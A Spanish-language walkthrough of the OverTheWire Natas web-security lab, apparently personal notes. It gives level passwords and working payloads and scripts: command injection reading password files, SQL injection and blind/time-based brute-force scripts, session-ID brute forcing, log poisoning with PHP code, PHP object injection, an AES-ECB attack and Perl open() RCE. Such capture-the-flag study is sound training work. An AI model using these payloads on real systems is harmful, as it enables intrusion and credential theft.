# NATAS - LAB_1
# Natas0
http://natas0.natas.labs.overthewire.org/
user: natas0
pass: natas0

Usamos click derecho e inspeccionar
0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq

# Natas1
http://natas1.natas.labs.overthewire.org/

pulsamos la teclas F12
TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI

# Natas2
http://natas2.natas.labs.overthewire.org/

ingresamos a http://natas2.natas.labs.overthewire.org/files/
entramos a http://natas2.natas.labs.overthewire.org/files/users.txt

3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH

# Natas3
http://natas3.natas.labs.overthewire.org/

ahora el archivo oculto se encuentra en http://natas3.natas.labs.overthewire.org/s3cr3t/

QryZXc2e0zahULdHrtHxzyYkj59kUxLQ

# Natas4
http://natas4.natas.labs.overthewire.org/

debemos entrar con natas5
nos ayudamos con Burp
para eso configuramos la red para que Firefox pueda usar mi proxy local. Para ello, abre Menú > Preferencias > Avanzadas > Red > Configuración de conexión… y configurarlo con localhost @ 127.0.0.1

cambiamos a http://natas5.natas.labs.overthewire.org/
obetnemos la contraseña
iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

volvemos las configuraciones a su estado original para no tener problemas

# Natas5
http://natas5.natas.labs.overthewire.org/

utilizamos Burp para interceptar el paquete natas5
cambiamos loggedin=0 por loggedin=1
obetenemos la contraseña aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

# Natas6
http://natas6.natas.labs.overthewire.org/

vemos el codigo fuente

~~~
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
~~~
entramos a http://natas6.natas.labs.overthewire.org/includes/secret.inc

secret = "FOEIUWGHFEEUHOFUOIU";

# Natas7

vemos el codigo fuente

~~~
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
this is the front page

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
~~~
se puede obtener la contraseña en etc/natas_webpass/natas8

entramos a: http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8.

DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

# Natas8
viendo el codigo
~~~
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
~~~

abriendo la consola e iniciando PHP con php -a. Podemos obtener la clave secreta de la clave codificada descodificandola en base64
~~~
php -a
echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));

oubWYf2kBq
~~~

# Natas9
viendo el codigo
~~~
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
~~~
utilizamos los comandos
~~~
grep -i password dictionary.txt
cat /etc/natas_webpass/natas10
grep -i ; cat /etc/natas_webpass/natas10

nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
~~~

# Natas10
codigo
~~~
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
~~~

~~~
.* /etc/natas_webpass/natas11
U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
~~~

# Natas11

los  cookies estan protegidos con XOR Encryption
Cookie: "data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D"

analizando el codigo fuente
~~~
<?
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
?>
~~~
A XOR B = C
obtendremos la salida de la clave qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq  reemplazamos $key con la clave que acabamos de encontrar

obtenemos el codigo: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

# Natas12
el codigo fuente
~~~
<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?> 
~~~
tenemos que subir un archivo .jpeg para /etc/natas_webpass/natas13.
lo subimo sale
El archivo upload/yh33kxvyt8.php se ha cargado

upload/yh33kxvyt8.php
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

# Natas13
~~~
function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else
~~~
Si observamos con atención las sentencias IF/ELSE, podemos ver que se utiliza exif_imagetype
Cambiemos el nombre 3hwxwqemk3.jpg a shell.php y reenviemos el paquete
Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

# Natas14
~~~
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else 
~~~

el inicio de sesión es vulnerable a un ataque de inyección SQL
~~~
SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"
SELECT * from users where username = "username" and password = "password"
SELECT * from users where username = ""="" and password = ""=""
~~~
la contraseña es: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J 

# Natas15
inyección SQL a ciegas
~~~
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else 
~~~
utilizamos:

~~~
SELECT * from users where username = "natas16" and password LIKE BINARY "a%"
~~~
utilizamos fuerza bruta con brute.py
~~~
#!/usr/bin/python

import requests

chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
exist = ''
password = ''
target = 'http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/index.php'
trueStr = 'This user exists.'

r = requests.get(target, verify=False)

for x in chars:
	r = requests.get(target+'?username=natas16" AND password LIKE BINARY "%'+x+'%" "')
	if r.content.find(trueStr) != -1:
		exist += x
		print 'Using: ' + exist

print 'All characters used. Starting brute force... Grab a coffee, might take a while!'

for i in range(32):
	for c in exist:
		r = requests.get(target+'?username=natas16" AND password LIKE BINARY "' + password + c + '%" "')
		if r.content.find(trueStr) != -1:
			password += c
			print 'Password: ' + password + '*' * int(32 - len(password))
			break

print 'Completed!'
~~~

WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

# Natas16
Obtener todos los caracteres excepto los números:
~~~
$(expr substr $(cat /etc/natas_webpass/natas17) 1 1)
a{$(($(expr substr $(cat /etc/natas_webpass/natas17) 1 1)-6))}
~~~
obtener en caso de letras

~~~
a{$(($(expr index $(expr substr $(grep -i Englishing dictionary.txt) 2 4) $(expr substr $(cat /etc/natas_webpass/natas17) 21 1))+0))}
$(expr substr $(cat /etc/natas_webpass/natas17) 5 1) #get the 5th letter of the password
a{$((1+1))} #used in grep as a regex, to find the words containing (1+1) times of “a” => “aa”
$(expr index “b” “abc”) #output the index of “b” in “abc” => 2
~~~

8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

# Natas17
Código de inyección MySQL
~~~
N0tAC0ntent” union select 1,if ((select password from users where CHAR_LENGTH(password)=32 limit 0,1) like binary “%”,sleep(2),1) —
~~~
utilizamos es siguiente script
~~~
import httplib,datetime
from base64 import b64encode
from urllib import quote

def checkPassword(password):
httpClient = None
try:
sql=’N0tAC0ntent” union select 1,if ((select password from users where CHAR_LENGTH(password)=32 limit 3,1) like binary “‘+password+’%”,sleep(0.5),1) — ‘ # change “3” from 0-3 to select which password to guess
startDatetime = datetime.datetime.now()
userAndPass = b64encode(b”natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw”).decode(“ascii”)
headers = { ‘Authorization’ : ‘Basic %s’ % userAndPass }
httpClient = httplib.HTTPConnection(‘natas17.natas.labs.overthewire.org’, 80, timeout=300)
httpClient.request(‘GET’, ‘/index.php?debug=a&username=’+quote(sql), headers=headers)
response = httpClient.getresponse()
#print response.read()
endDatetime = datetime.datetime.now()
if int((endDatetime-startDatetime).microseconds) >= 600000: # change “600000” to fit the current latency of network (over 500000 as 0.5s but not too high)
return True
else:
return False
except Exception, e:
print e
finally:
if httpClient:
httpClient.close()

def autocheck(currentpass):
passbook=”ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789″
if checkPassword(currentpass):
print currentpass
if len(currentpass)==32:
print “Possible Result:”+currentpass
return
for item in passbook:
autocheck(currentpass+item)

password=””
autocheck(password)
~~~
0:0xjsNNjGvHkb7pwgC6PrAyLNT0pYCqHd (not this one)
1:MeYdu6MbjewqcokG0kD4LrSsUZtfxOQ2 (not this one)
2:VOFWy9nHX9WUMo9Ei9WVKh8xLP1mrHKD (not this one)
3:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP (Real password)

xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

# Natas18
utilizamos
~~~
import httplib,sys
from base64 import b64encode

def check(sessid):
httpClient = None
try:
userAndPass = b64encode(b”natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP”).decode(“ascii”)
cookie = ‘PHPSESSID=’+str(sessid)
headers = { ‘Authorization’ : ‘Basic %s’ % userAndPass , ‘Cookie’ : cookie }
httpClient = httplib.HTTPConnection(‘natas18.natas.labs.overthewire.org’, 80, timeout=300)
httpClient.request(‘GET’, ‘/index.php?debug=a’, headers=headers)
response = httpClient.getresponse()
responseData = response.read()
if ‘regular’ in responseData:
print ‘regular ‘+str(sessid)
else:
print responseData
sys.exit()
except Exception, e:
print e
finally:
if httpClient:
httpClient.close()

def autocheck():
for i in range(0,641):
check(i)

autocheck()
~~~

La sesión de admin está en 138
4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs

# Natas19
utilizamos
~~~
import httplib,sys
from base64 import b64encode
from urllib import urlencode

def check(sessid):
httpClient = None
try:
userAndPass = b64encode(b”natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs”).decode(“ascii”)
body=urlencode({‘username’ : ‘admin’ , ‘password’ : ‘aaa’ }) # username must be admin: it will affect how PHPSESSID is generated; password could be any string
cookie = ‘PHPSESSID=’+str(sessid)
headers = { ‘Authorization’ : ‘Basic %s’ % userAndPass , ‘Content-Type’: ‘application/x-www-form-urlencoded’ , ‘Cookie’ : cookie }
httpClient = httplib.HTTPConnection(‘natas19.natas.labs.overthewire.org’, 80, timeout=300)
httpClient.request(‘POST’, ‘/index.php?debug=a’ ,body=body,headers=headers)
response = httpClient.getresponse()
responseData = response.read()
#print responseData
if ‘regular’ in responseData:
print ‘regular ‘+str(sessid)
else:
print responseData
sys.exit()
except Exception, e:
print e
finally:
if httpClient:
httpClient.close()

def autocheck():
for i in range(0,1000):
a = i/100
b = i/10-a*10
c = i%10
sessid=”
if not a==0:
sessid+=’3’+str(a)
if not b==0:
sessid+=’3’+str(b)
if not c==0:
sessid+=’3’+str(c)
sessid+=’2d61646d696e’
check(sessid)

autocheck()
~~~
El ID de sesión del administrador es 38392d61646d696e (089)
eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF

# Natas20
~~~
import httplib,sys
from base64 import b64encode
from urllib import urlencode

def check(sessid):
httpClient = None
try:
userAndPass = b64encode(b”natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF”).decode(“ascii”)
body=urlencode({‘name’ : ‘whatevername\nadmin 1’})
cookie = ‘PHPSESSID=’+str(sessid)
headers = { ‘Authorization’ : ‘Basic %s’ % userAndPass , ‘Content-Type’: ‘application/x-www-form-urlencoded’ , ‘Cookie’ : cookie }
httpClient = httplib.HTTPConnection(‘natas20.natas.labs.overthewire.org’, 80, timeout=300)
httpClient.request(‘POST’, ‘/index.php?debug=a’, body=body, headers=headers)
response = httpClient.getresponse()
responseData = response.read()
print responseData
except Exception, e:
print e
finally:
if httpClient:
httpClient.close()

check(‘whateversessid’)
~~~
Inyección: “whatevername\nadmin 1” 
Ejecutar el programa dos veces: la primera vez, ejecute mywrite para inyectar la sesión; la segunda vez, ejecute myread para establecer admin en 1. IFekPyrQXftziDEsUr3x21sYuahypdgJ

# Natas21
~~~
import httplib,sys
from base64 import b64encode
from urllib import urlencode

sessid=’whateversessid’
httpClient = None
try:
userAndPass = b64encode(b”natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ”).decode(“ascii”)
body=urlencode({‘submit’ : ‘a’, ‘admin’:’1′})
cookie = ‘PHPSESSID=’+str(sessid)
headers = { ‘Authorization’ : ‘Basic %s’ % userAndPass , ‘Content-Type’: ‘application/x-www-form-urlencoded’ , ‘Cookie’ : cookie }
httpClient = httplib.HTTPConnection(‘natas21-experimenter.natas.labs.overthewire.org’, 80, timeout=300)
httpClient.request(‘POST’, ‘/index.php?debug=a’, body=body, headers=headers)
response = httpClient.getresponse()
responseData = response.read()
print responseData
except Exception, e:
print e
finally:
if httpClient:
httpClient.close()

httpClient = None
try:
userAndPass = b64encode(b”natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ”).decode(“ascii”)
cookie = ‘PHPSESSID=’+str(sessid)
headers = { ‘Authorization’ : ‘Basic %s’ % userAndPass , ‘Content-Type’: ‘application/x-www-form-urlencoded’ , ‘Cookie’ : cookie }
httpClient = httplib.HTTPConnection(‘natas21.natas.labs.overthewire.org’, 80, timeout=300)
httpClient.request(‘GET’, ‘/index.php’, headers=headers)
response = httpClient.getresponse()
responseData = response.read()
print responseData
except Exception, e:
print e
finally:
if httpClient:
httpClient.close()
~~~
Dos sitios web comparten la misma sesión
chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ

# Natas22
~~~
import httplib,sys
from base64 import b64encode
from urllib import urlencode

httpClient = None
try:
userAndPass = b64encode(b”natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ”).decode(“ascii”)
#body=urlencode({‘submit’ : ‘a’, ‘admin’:’1′})
#cookie = ‘PHPSESSID=’+str(sessid)
headers = { ‘Authorization’ : ‘Basic %s’ % userAndPass , ‘Content-Type’: ‘application/x-www-form-urlencoded’ }#, ‘Cookie’ : cookie }
httpClient = httplib.HTTPConnection(‘natas22.natas.labs.overthewire.org’, 80, timeout=300)
httpClient.request(‘GET’, ‘/index.php?revelio=a’, headers=headers)
response = httpClient.getresponse()
responseData = response.read()
print responseData
except Exception, e:
print e
finally:
if httpClient:
httpClient.close()
~~~

Al programa no le importa qué es una “Ubicación”
D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE

# Natas23

11iloveyou
OsRmXFguozKpTZZ5X14zNO43379LZveg

# Natas24
http://natas24.natas.labs.overthewire.org/?passwd[]=1

strcmp devuelve 0 al comparar una matriz con una cadena y da como resultado una excepción
GHF6X7YwACaYYssHVY05cFq83hRktl4c

# Natas25

~~~
import httplib,sys
from base64 import b64encode
from urllib import urlencode

sessid=’whateversessid’
langstr=’….//….//….//….//….//var/www/natas/natas25/logs/natas25_whateversessid.log’
httpClient = None
try:
userAndPass = b64encode(b”natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c”).decode(“ascii”)
cookie = ‘PHPSESSID=’+str(sessid)
headers = { ‘Authorization’ : ‘Basic %s’ % userAndPass , ‘Content-Type’: ‘application/x-www-form-urlencoded’ , ‘Cookie’ : cookie , ‘User-Agent’ : ‘<? passthru(“cat /etc/natas_webpass/natas26”) ?>’}
httpClient = httplib.HTTPConnection(‘natas25.natas.labs.overthewire.org’, 80, timeout=300)
httpClient.request(‘GET’, ‘/index.php?lang=’+langstr, headers=headers)
response = httpClient.getresponse()
responseData = response.read()
print responseData
except Exception, e:
print e
finally:
if httpClient:
httpClient.close()
~~~

“….//” se convierte en “../” después del primer filtro
Utilice el agente de usuario para ejecutar el código

oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T

# Natas26
Inyección de objetos PHP
Crea un PHP y ejecuta:

~~~
<?php
class Logger{
private $logFile;
private $initMsg;
private $exitMsg;
function __construct(){
// initialise variables
$this->initMsg=”#–session started–#\n”;
$this->exitMsg=”<?php include_once(‘/etc/natas_webpass/natas27’);?>”;
$this->logFile = “img/output.php”;
}
}
$output[]=new Logger();
echo base64_encode(serialize($output));
?>
~~~

Intente que la cadena de salida con codificación base64 esté libre de “=”
 Salida Cadena: YToxOntpOjA7Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNjoiaW1nL3doYXRpc2l0LnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjIyOiIjLS1zZXNzaW9uIHN0YXJ0ZWQtLSMKIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NDY6Ijw/cGhwIGluY2x1ZGUoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7Pz4iO319
 
Luego, envíe esta cadena como "dibujo" en el Cookie. Al ejecutar la función de destrucción (automática), escribirá un archivo PHP para mostrar el archivo de contraseñas
55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ

# Natas27

Seguir insertando datos con el nombre de usuario "natas28" y una contraseña. Como la base de datos se borra en 5 minutos, la inserción se realizaría accidentalmente. Luego, consultar con el nombre de usuario y la contraseña para obtener la contraseña real

~~~
function setLanguage(){
    /* language setup */
    if(array_key_exists("lang",$_REQUEST))
        if(safeinclude("language/" . $_REQUEST["lang"] ))
            return 1;
    safeinclude("language/en"); 
}

function safeinclude($filename){
    // check for directory traversal
    if(strstr($filename,"../")){
        logRequest("Directory traversal attempt! fixing request.");
        $filename=str_replace("../","",$filename);
    }
    // dont let ppl steal our passwords
    if(strstr($filename,"natas_webpass")){
        logRequest("Illegal file access detected! Aborting!");
        exit(-1);
    }
    // add more checks...

    if (file_exists($filename)) { 
        include($filename);
        return 1;
    }
    return 0;
}
function logRequest($message){
    $log="[". date("d.m.Y H::i:s",time()) ."]";
    $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
    $log=$log . " \"" . $message ."\"\n"; 
    $fd=fopen("/tmp/natas25_" . session_id() .".log","a");
    fwrite($fd,$log);
    fclose($fd);
}
~~~
JWwR438wkgTsNKBbcJoowyysdM82YjeF

# Natas28

Ataque de texto plano elegido en modo AES-ECB e inyección SQL
~~~
import httplib,sys,binascii
from base64 import b64encode,b64decode
from urllib import quote,unquote

def check(query):
query=quote(query)
httpClient = None
try:
userAndPass = b64encode(b”natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF”).decode(“ascii”)
headers = { ‘Authorization’ : ‘Basic %s’ % userAndPass , ‘Content-Type’: ‘application/x-www-form-urlencoded’}
httpClient = httplib.HTTPConnection(‘natas28.natas.labs.overthewire.org’, 80, timeout=300)
httpClient.request(‘GET’, ‘/index.php?query=’+query, headers=headers)
response = httpClient.getresponse()
#responseData = response.read()
result = response.getheader(‘Location’)
return binascii.b2a_hex(b64decode(unquote(result[result.find(‘query=’)+6:])))
except Exception, e:
print e
finally:
if httpClient:
httpClient.close()

def outputhex(str):
i=0
newStr=”
for c in str:
i+=1
if i%32==0:
newStr+=c+’ ‘
else:
newStr+=c
print newStr

def xorInside(str1,str2):
first=str1.decode(‘hex’)
second=str2.decode(‘hex’)
newStr=”
for i in range(0,16):
newStr+= chr(ord(first[i])^ord(second[i]))
return binascii.b2a_hex(newStr)

def autocheck():
a=”
b=”
for i in range(1,80):
a+=’a’
b+=’b’
outputhex(check(a))
outputhex(check(b))

autocheck()
~~~

Mensaje = Escape(Entrada_original)
Mensaje_a_cifrar = Prefijo[38] | Mensaje | Sufijo[30] | Relleno(PKCS#7?)
Mensaje_cifrado = AES-ECB(Mensaje_a_cifrar)
Mensaje_a_enviar = Base_64(Mensaje_cifrado)

~~~
import httplib,sys,binascii
from base64 import b64encode,b64decode
from urllib import quote,unquote

def check(query):
query=quote(query)
httpClient = None
try:
userAndPass = b64encode(b”natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF”).decode(“ascii”)
headers = { ‘Authorization’ : ‘Basic %s’ % userAndPass , ‘Content-Type’: ‘application/x-www-form-urlencoded’}
httpClient = httplib.HTTPConnection(‘natas28.natas.labs.overthewire.org’, 80, timeout=300)
httpClient.request(‘GET’, ‘/index.php?query=’+query, headers=headers)
response = httpClient.getresponse()
#responseData = response.read()
result = response.getheader(‘Location’)
return binascii.b2a_hex(b64decode(unquote(result[result.find(‘query=’)+6:])))
except Exception, e:
print e
finally:
if httpClient:
httpClient.close()

def outputhex(str):
i=0
newStr=”
for c in str:
i+=1
if i%32==0:
newStr+=c+’ ‘
else:
newStr+=c
print newStr
print “<br/>”

def xorInside(str1,str2):
first=str1.decode(‘hex’)
second=str2.decode(‘hex’)
newStr=”
for i in range(0,16):
newStr+= chr(ord(first[i])^ord(second[i]))
return binascii.b2a_hex(newStr)

def autocheck():
a=”
b=”
for i in range(1,80):
a+=’a’
b+=’b’
outputhex(check(a))
outputhex(check(b))

#sql=”aaaaaaaaa”+”‘ or 1=1 — bbbb”+”bbbbbbbbbbbbbbbb”+”bbbbbbbbbbbbbbbb”+”aa”
#sql= “aaaaaaaaa”+”‘ union select 1″+” from users — b”+”bbbbbbbbbbbbbbbb”+”aa”
sql= “aaaaaaaaa”+”‘ union select p”+”assword from use”+”rs — bbbbbbbbbb”+”aa”

print binascii.b2a_hex(sql)
outputhex(check(sql))

sqlinj=check(sql)
sqlinj =’1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e’

#sqlinj+=’42094fd365d8e79ba6bbbe58b962416b’+’88a7bd72cda247dae1c3219f054b2e60’+’88a7bd72cda247dae1c3219f054b2e60′
#sqlinj+=’9ae5ffe4df58364079bd3029586df0d6’+’2730431c345fce894d727ac6b56a6762’+’88a7bd72cda247dae1c3219f054b2e60′
sqlinj+= ‘f89dd8dbec15c6a6d9993a3dc7b7a308’+’86951754f7ad56454eb5d5b6768ee646’+’b65a5da3890587484e1107767874df16’

sqlinj+=’ce82a9553b65b81280fb6d3bf2900f4775fd5044fd063d26f6bb7f734b41c899′
print quote(b64encode(sqlinj.decode(‘hex’)))

#autocheck()
~~~

airooCaiseiyee8he8xongien9euhe8b

# Natas29

Perl RCE a través de open().
En la función open() de Perl, el nombre del archivo se puede interpretar como un comando
El carácter de barra vertical | se puede usar para activar este modo
El parámetro file de esta página se puede inyectar y podemos obtener RCE usando elementos como |id%00 o |id%26%26false%26%26

http://natas29.natas.labs.overthewire.org/index.pl?file=|cat /etc/na“tas_webpass/na“tas30%00
wie9iexae0Daihohv8vuu3cei9wahf0e

# Natas30

Inyección SQL mediante quote() con argumento de lista
username=abcd&password=’abcd’ or 1=1&password=2

hay7aecuungiuKaezuathuk9biin0pu1

# Natas31
Perl CGI upload(), param() and <> issues

~~~
POST /index.pl?/etc/natas_webpass/natas32 HTTP/1.1
Host: natas31.natas.labs.overthewire.org
Content-Length: 348
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMTpoYXk3YWVjdXVuZ2l1S2FlenVhdGh1azliaWluMHB1MQ==
Origin: http://natas31.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=—-WebKitFormBoundaryFgVNNE987xWnwuo7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,und;q=0.8
Connection: close

——WebKitFormBoundaryFgVNNE987xWnwuo7
Content-Disposition: form-data; name=”file”

ARGV
——WebKitFormBoundaryFgVNNE987xWnwuo7
Content-Disposition: form-data; name=”file”; filename=”abc”

abcde
——WebKitFormBoundaryFgVNNE987xWnwuo7
Content-Disposition: form-data; name=”submit”

Upload
——WebKitFormBoundaryFgVNNE987xWnwuo7–
~~~

no1vohsheCaiv3ieH4em1ahchisainge

# Natas32
Un pequeño ajuste para incorporarlo a RCE

~~~
POST /index.pl?[code] HTTP/1.1
Host: natas32.natas.labs.overthewire.org
Content-Length: 384
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMjpubzF2b2hzaGVDYWl2M2llSDRlbTFhaGNoaXNhaW5nZQ==
Origin: http://natas32.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=—-WebKitFormBoundaryRBTu3E1JQ8QW7zwK
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,und;q=0.8
Connection: close

——WebKitFormBoundaryRBTu3E1JQ8QW7zwK
Content-Disposition: form-data; name=”file”

ARGV
——WebKitFormBoundaryRBTu3E1JQ8QW7zwK
Content-Disposition: form-data; name=”file”; filename=”abc”
Content-Type: text/plain

abcde
——WebKitFormBoundaryRBTu3E1JQ8QW7zwK
Content-Disposition: form-data; name=”submit”

Upload
——WebKitFormBoundaryRBTu3E1JQ8QW7zwK–
~~~

Debería ser algo como código%20para%20ejecutar%20|
primero ejecute ls%20.%20|  para encontrar un binario getpassword en la misma carpeta
Luego ejecute ./getpassword%20|  para obtener la contraseña

shoogeiGa2yee3de6Aex8uaXeech5eey

# Natas33

~~~
POST /index.php HTTP/1.1
Host: natas33.natas.labs.overthewire.org
Content-Length: 475
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMzpzaG9vZ2VpR2EyeWVlM2RlNkFleDh1YVhlZWNoNWVleQ==
Origin: http://natas33.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=—-WebKitFormBoundaryrDg9m1cnIOTLcDtc
